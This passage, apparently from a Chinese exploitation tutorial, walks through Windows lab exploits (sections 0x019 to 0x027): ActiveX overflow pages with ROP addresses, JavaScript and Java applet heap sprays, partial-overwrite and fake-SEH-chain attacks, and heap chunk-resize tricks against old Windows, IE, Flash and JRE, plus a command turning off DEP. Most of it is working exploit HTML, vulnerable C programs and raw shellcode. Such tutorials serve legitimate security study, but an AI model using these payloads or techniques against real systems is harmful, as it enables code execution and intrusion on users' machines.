            "\u7574\u8be9\u247a\uc701\u8b66\u6f2c\u7a8b\u011c" +
            "\u8bc7\uaf7c\u01fc\u68c7\u2067\u0120\u7968\u7530" +
            "\u686e\u7720\u6f6f\ue189\u49fe\u310b\u51c0\uff50" +
            "\u90d7");
    }
}
```

编译生成*.class文件
```
> javac path/to/*.java -target 1.1
```

新建文本文件, 贴入以下代码, 更名为test.html
```
<html>
<body>
<applet code=Shellcode.class width=300 height=50></applet>
<script>alert("开始溢出!");</script>
<object classid="clsid:06BC9528-F8A0-456B-BBBB-09C1248BF827" id="test"></object>  
<script>  
var s = "\u9090";
while (s.length < 54) {
s += "\u9090";
}
s+="\u9090\u9090";
test.test(s);  
</script>  
</body>  
</html>
```

将VulnerAX_DEP.ocx和以上两个文件一起放到wwwroot目录, 注册*.ocx文件

打开IE7.0, 访问http://127.0.0.1/test.html, 再双击打开test.html文件
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x018-001.png)

来到这里OD附加上去, 选择"E"打开模块, ocx成功加载
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x018-002.png)

检索shellcode的开始几个字节, 定位到0x1454D9FC
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x018-003.png)

修改test.html
```
<html>
<body>
<object classID="DEP_NETDLL.dll#DEP_NETDLL.Class1"></object>
<object classid="clsid:06BC9528-F8A0-456B-BBBB-09C1248BF827" id="test"></object>
<script>
var s="\u9090";
while(s.length<54){
	s+="\u9090";
}
s+="\uD9FC\u1454";
test.test(s);
</script>
</body>
</html>
```

关闭调试, 直接运行, pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x018-004.png)


## 0x019 攻击未启用ASLR的模块

>[分析环境]  
>系统: Windows 7 Professional sp0 x86  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  
>浏览器: Internet Explorer 8  
>Flash Player ActiveX: 9.0.262  
>注意: 关闭系统DEP  

确定Flash9k.ocx加载基址是否固定不变, 重启前
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x019-001.png)

重启后
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x019-002.png)

然后注册*.ocx, 这里可以用VulnerAX_DEP.ocx
```
<html>  
<body>  
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0" width="160" height="260">
  <param name="movie" value="1.swf" />
  <param name="quality" value="high" />
  <embed src="1.swf" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="160" height="260"></embed>
</object>
<object classid="clsid:39F64D5B-74E8-482F-95F4-918E54B1B2C8" id="test"></object>  
<script>  
var s = "\u9090";
while (s.length < 54) {
s += "\u9090";
}
s += "\u9090\u9090";
test.test(s);  
</script>  
</body>  
</html>
```

准备test.html文件, 贴入以上内容
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x019-003.png)

来到这里OD附加上去
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x019-004.png)

EIP已经被覆盖成0x90909090

避免DEP干扰实验, 先关掉
```
> bcdedit.exe/set {current} nx AlwaysOff
``` 

![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x019-005.png)
然后构造rop, 在Flash9k.ocx空间找到两条jmp esi(0xFFE6)指令

![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x019-006.png)
0x100A5FC7处含有未知指令C7, 只有0x1012E78A能用

![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x019-007.png)
这里要读[EAX], 先修复一EAX

![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x019-008.png)
找到一条mov eax,edx retn 8(0x1014d286)

完整的exp
```
<html>  
<body>  
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0" width="160" height="260">
  <param name="movie" value="1.swf" />
  <param name="quality" value="high" />
  <embed src="1.swf" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="160" height="260"></embed>
</object>
<object classid="clsid:06BC9528-F8A0-456B-BBBB-09C1248BF827" id="test"></object>  
<script>  
var s = "\u9090";
while (s.length < 54) {
s += "\u9090";
}
s += "\uD286\u1014\u9090\u9090\uE78A\u1012\u9090\u9090";
s += "\ud231\u30b2\u8b64\u8b12\u0c52\u528b\u8b1c\u0842\u728b\u8b20\u8012\u0c7e\u7533\u89f2\u03c7\u3c78\u578b\u0178\u8bc2\u207a\uc701\ued31\u348b\u01af\u45c6\u3e81\u6146\u6174\uf275\u7e81\u4508\u6978\u7574\u8be9\u247a\uc701\u8b66\u6f2c\u7a8b\u011c\u8bc7\uaf7c\u01fc\u68c7\u2067\u0120\u7968\u7530\u686e\u7720\u6f6f\ue189\u49fe\u310b\u51c0\uff50\u90d7";
test.test(s);  
</script>  
</body>  
</html>
```

pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x019-009.png)


## 0x020 利用部分覆盖定位内存地址

>[分析环境]  
>系统: Windows 7 Professional sp0 x86  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  
>注意: 关闭系统DEP  

新建一个工程, 贴入以下代码
```
// Partial_ASLR.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "stdlib.h"

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x90\x90";

char* test()
{
	char tt[256];
	memcpy(tt,shellcode,262);
	return tt;
}

int _tmain(int argc, _TCHAR* argv[])
{
	char temp[200];
	__asm int 3;
	test();

	return 0;
}
```

拖到OD调试, 来到这里
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x020-001.png)

返回地址的低2 byte已经覆盖成0x9090
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x020-002.png)

返回值eax指向缓冲区的起始
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x020-003.png)

在执行文件本身找到一条call/jmp eax(0x009D141E)就能跳到栈上
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x020-004.png)

完整的shellcode
```
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x1E\x14";
```

pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x020-005.png)


## 0x021 利用Heap Spray技术定位内存地址

>[分析环境]  
>系统: Windows Vista Ultimate sp0 x86  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  
>浏览器: Internet Explorer 7  
>Flash Player ActiveX: 9.0.262  
>注意: 关闭系统DEP  

新建test.html, 贴入以下代码
```
<html>  
<body>  
<object classid="clsid:A5E74D94-AAB9-4A83-8216-250BA9D9E578" id="test"></object>  
<script>  
                                                                                                                                                                                                                                                                                   
</script>  
</body>  
</html>
```

OD附加上去, 在内存检索0x81828281, 可以看到申请的内存块
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x021-001.png)

重启后
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x021-002.png)

填充shellcode
```
<html>  
<body>  
<object classid="clsid:A5E74D94-AAB9-4A83-8216-250BA9D9E578" id="test"></object>  
<script>  
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
</script>  
</body>  
</html>
```

pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x021-003.png)


## 0x022 为.NET控件禁用ASLR

>[分析环境]  
>系统: Windows Vista Ultimate sp0 x86  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  
>注意: 关闭系统DEP  

PE文件是否启用ASLR校验过程
```
......
if( !(pBinaryInfo->pHeaderInfo->usDllCharacteristics & IMAGE_DLL_ CHARACTERISTICS_ DYNAMIC_BASE) &&
		!(pBinaryInfo->pHeaderInfo->bFlags &PINFO_IL_ONLY_IMAGE) && !(_MmMoveImages == -1) )
{
	MiNoRelocate++;
	return 0;
}
......
```

.NET文件是否IL-Only校验过程, 版本号<2.5认定为IL-Only
```
......
if( ( (pCORHeader->MajorRuntimeVersion > 2) || (pCORHeader->MajorRuntime- Version == 2 && 
	pCORHeader->MinorRuntimeVersion >= 5) ) && (pCORHeader->Flags & COMIMAGE_FLAGS_ILONLY) )
{
	pImageControlArea->pBinaryInfo->pHeaderInfo->bFlags |= PINFO_IL_ONLY_
	IMAGE;
	......
}
......
```

修改DEP_NETDLL.dll
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x022-001.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x022-002.png)

新建test.html, 这里依旧要用到VulnerAX.ocx
```
<html>
<body>
<object classID="DEP_NETDLL.dll#DEP_NETDLL.Class1"></object>
<object classid="clsid:A5E74D94-AAB9-4A83-8216-250BA9D9E578" id="test"></object>
<script>
var s="\u9090";
while(s.length<54){
	s+="\u9090";
}
s+="\u24E2\u2424";
test.test(s);
</script>
</body>
</html>
```

OD附加上去, DEP_NETDLL.dll的加载基址没有随机化
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x022-003.png)

直接运行, pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x022-004.png)


## 0x023 利用Java applet heap spray技术定位内存地址

>[分析环境]  
>系统: Windows vista Professional sp0 x86  
>编译器: Visual Studio 2008  
>调试器: OllyDbg 1.10  
>JRE版本: 1.4.2_06  
>注意: 关闭系统DEP  

新建AppletSpray.java, 贴入以下代码
```
//AppletSpray.java

import java.applet.*;
import java.awt.*;

public class AppletSpray extends Applet{
	public void init(){
		String[] mem=new String[1024];
		StringBuffer buffer=new StringBuffer(0x100000/2);
		buffer.append("\u8281\u8182");
		for(int i=0;i<(0x100000-16)/2;i++)
			buffer.append('\u9090');
		Runtime.getRuntime().gc();
		for(int j=0;j<90;j++)
			mem[j]+=buffer.toString();
	}
}
```

编译Applet
```
> javac path\to\*.java -target 1.1
```

新建test.html, 贴入以下代码
```
<html>
<body>
<applet code=AppletSpray.class width=300 height=50></applet>
<script>alert("开始溢出!");</script>
</body>
</html>
```

OD附加上去, 在内存检索0x81828281
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x023-001.png)

重启后
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x023-002.png)

选择0x11111111作为稳定的跳转地址, 填充shellcode
```
//exp.java

import java.applet.*;
import java.awt.*;

public class exp extends Applet{
	public void init(){
		String shellcode="\ud231\u30b2\u8b64\u8b12\u0c52\u528b\u8b1c\u0842" +
            	"\u728b\u8b20\u8012\u0c7e\u7533\u89f2\u03c7\u3c78" +
            	"\u578b\u0178\u8bc2\u207a\uc701\ued31\u348b\u01af" +
            	"\u45c6\u3e81\u6146\u6174\uf275\u7e81\u4508\u6978" +
            	"\u7574\u8be9\u247a\uc701\u8b66\u6f2c\u7a8b\u011c" +
            	"\u8bc7\uaf7c\u01fc\u68c7\u2067\u0120\u7968\u7530" +
            	"\u686e\u7720\u6f6f\ue189\u49fe\u310b\u51c0\uff50" +
            	"\u90d7";
		String[] mem=new String[1024];
		StringBuffer buffer=new StringBuffer(0x100000/2);
		for(int i=0;i<(0x100000-14)/2-shellcode.length();i++)
			buffer.append('\u9090');
		buffer.append(shellcode);
		Runtime.getRuntime().gc();
		for(int j=0;j<90;j++)
			mem[j]+=buffer.toString();
	}
}
```

新建exp.html
```
<html>
<body>
<applet code=exp.class width=300 height=50></applet>
<object classid="clsid:A5E74D94-AAB9-4A83-8216-250BA9D9E578" id="test"></object>
<script>
var s = "\u9090";
while(s.length < 54){
	s += "\u9090";
}
s += "\u1111\u1111";
test.test(s);
</script>
</body>
</html>
```

pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x023-003.png)


## 0x024 利用未启用SEHOP的模块

>[分析环境]  
>系统: Windows 7 Ultimate sp0 x86  
>编译器: Visual Studio 2008、VC++ 6.0  
>调试器: OllyDbg 1.10  
>注意: 关闭系统DEP  

打开系统SEHOP
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x00.png)

参考SafeS.E.H这章, exe文件关掉DEP、ASLR, dll文件不作改动

修改shellcode
```
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x12\x10\x12\x11"		//address of pop pop retn in No_SafeSEH module
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09"
"\x8B\x09"				// mov ecx,[ecx]
"\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x30\x75\x6e\x67\x68\x77\x6f\x6f\x79\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
```

将dll文件拖到CFF Explorer, 如下修改
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x01.png)

直接运行崩掉, 暂时不清楚什么原因
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x02.png)


## 0x025 伪造S.E.H链表

>[分析环境]  
>系统: Windows 7 Ultimate sp0 x86  
>编译器: Visual Studio 2008、VC++ 6.0  
>调试器: OllyDbg 1.10  
>注意: 关闭系统DEP、开启SEHOP  

新建一个工程, 贴入以下代码
```
// fakeSEH.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <string.h>
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x14\xFF\x12\x00"		// Point to fakeSEH
"\x12\x10\x12\x11"		//address of pop pop retn in No_SafeSEH module
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09"
"\x8B\x09"				// mov ecx,[ecx]
"\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x30\x75\x6e\x67\x68\x77\x6f\x6f\x79\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
"\x90\x90"
"\xFF\xFF\xFF\xFF"		// SEH End Node
"\x75\xA8\xF1\x76";

DWORD MyException(void)
{
	printf("There is an exception");
	getchar();
	return 1;
}

void test(char * input)
{
	char str[200];
	memcpy(str,input,412);	
	int zero=0;

	__try
	{
		zero=1/zero;
	}
	__except(MyException())
	{
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	HINSTANCE hInst = LoadLibrary(_T("SEH_NoSafeSEH_JUMP.dll"));
	char str[200];

	//__asm int 3
	test(shellcode);

	return 0;
}
```

OD附加上去, 找到S.E.H链的尾部
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x025-001.png)

这里是伪造的S.E.H尾节点
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x025-002.png)

直接运行, pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x025-00.png)


## 0x026 利用chunk重设大小攻击堆

>[分析环境]  
>系统: Windows XP Professional sp2 x86  
>编译器: VC++ 6.0  
>调试器: OllyDbg 1.10  
>注意: 原版的OD没法在FreeList操作指令断下, 可以用吾爱破解OD  
>原理: XP系统只有在堆链表删除操作时才进行Safe Unlink检查, 那么只要在堆分配时完成劫持, 就不会触发该机制  

新建一个工程, 贴入以下代码
```
#include "stdafx.h"
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

int main(int argc, char* argv[])
{
	HLOCAL h1,h2;
	HANDLE hp;

	hp = HeapCreate(0,0x1000,0x10000);
	__asm int 3
	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,3);
	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,5);
	memcpy(h1,shellcode,3);
	memcpy(h2,shellcode,5);

	return 0;
}
```

OD附加上去, 单步到完成两次分配
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x026-001.png)

堆表起始于0x00390178, 堆块起始于0x00390680
```
# 第1块
Self Size = 00 04 # 0x04*8=0x20 bytes, 请求3 bytes
Previous chunk Size = 00 08
Cookie = 01
Flags = 07
Unused bytes = 1D # 0x20-0x03=0x1D bytes
Segment index = 00

# 第2块
Self Size = 00 04 # 0x04*8=0x20 bytes, 请求5 bytes
Previous chunk Size = 00 04
Cookie = 05
Flags = 07
Unused bytes = 1B # 0x20-0x05=0x1B bytes
Segment index = 00

# 第3块(空闲大chunk, 未使用)
Self Size = 01 28 # 0x128*8=0x940 bytes, 0x980 - 0x20 * 2 = 0x940
Previous chunk Size = 00 04
Cookie = EE
Flags = 14
Unused bytes = EE
Segment index = 00
```

![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x026-002.png)
可以看到这两个chunk的尾部还留有剩余空间, 发现原版OD在调试堆时有问题, 以下该用吾爱破解OD
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x026-003.png)

再重新看一下堆结构
```
# 第1块
Self Size = 00 02 # 0x02*8=0x10 bytes, 请求3 bytes
Previous chunk Size = 00 08
Cookie = 78
Flags = 01
Unused bytes = 0D # 0x10-0x03=0x0D bytes
Segment index = 00

# 第2块
Self Size = 00 02 # 0x02*8=0x10 bytes, 请求5 bytes
Previous chunk Size = 00 02
Cookie = 7A
Flags = 01
Unused bytes = 0B # 0x10-0x05=0x0B bytes
Segment index = 00

# 第3块(空闲大chunk, 未使用)
Self Size = 01 2C # 0x12C*8=0x960 bytes, 0x980 - 0x10 * 2 = 0x960
Previous chunk Size = 00 02
Cookie = 00
Flags = 10
Unused bytes = 00
Segment index = 00
```
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x026-004.png)

贴入以下代码
```
#include "stdafx.h"
#include <stdio.h>
#include <windows.h>

char shellcode[]=  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x10\x01\x10\x00\x99\x99\x99\x99"		// Header
"\xEB\x06\x39\x00\xEB\x06\x39\x00"		// Flink Blink
"\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\xEB\x31"		// short jmp
"\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
"\x11\x01\x10\x00\x99\x99\x99\x99"		// Header
"\x8C\x06\x39\x00\xE4\xFF\x12\x00"		// fake Flink Blink
"\x90\x90\x90\x90"  
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7";

int main(int argc, char* argv[])
{
	HLOCAL h1,h2;
	HANDLE hp;

	hp = HeapCreate(0,0x1000,0x10000);
	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
	memcpy(h1,shellcode,300);
	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
	
	int zero=0;
	zero=1/zero;
	printf("%d",zero);

	return 0;
}
```

单步到完成第一次分配
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x026-005.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x026-006.png)

在0x7c931513处下断
```
lea eax,dword ptr ds:[edi+0x8]		// 获取新chunk的Flink位置
mov dword ptr ss:[ebp-0xF0],eax
mov edx,dword ptr ds:[ecx+0x4]		// 获取下一新chunk中的Blink的值
mov dword ptr ss:[ebp-0xF8],edx
mov dword ptr ds:[eax],ecx 			// 保存新chunk的Flink
mov dword ptr ds:[eax+0x4],edx		// 保存新chunk的Blink
mov dword ptr ds:[edx],eax			// 保存下一chunk中的Blink->Flink的Flink
ov dword ptr ds:[ecx+0x4],eax		// 保存下一chunk中的Blink
```

[0x003A06B8] = 0x003A06EB, 新chunk->Flink = 旧chunk->Flink
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x026-007.png)

[0x003A06B8+4] = 0x0012FFE4, 新chunk->Blink = 旧chunk->Flink->Blink
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x026-008.png)
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x026-009.png)

[0x0012FFE4] = 0x003A06B8, 旧chunk->Flink->Blink->Flink = 新chunk, 触发任意写
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x026-010.png)

现在S.E.H链尾节点的Handler已经改写成堆地址
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x026-011.png)

[0x003A06EB+4] = 0x003A06B8, 旧chunk->Flink->Blink = 新chunk
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x026-012.png)

当触发异常, 转入shellcode执行
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x026-013.png)

pwn~
![](/assets/img/exploit/2017-10-01-windows-binary-system-0day/0x026-014.png)

最后还有点问题, 吾爱破解OD加载时堆基址是0x003A0000, 直接运行要改成0x00390000


## 0x027 利用Lookaside表进行堆溢出

>[分析环境]  
>系统: Windows XP Professional sp2 x86  
>编译器: VC++ 6.0  
>调试器: OllyDbg 1.10  
>注意: 原版OD调试堆时有些问题, 建议用吾爱OD

新建一个工程, 贴入以下代码
```
#include "stdafx.h"
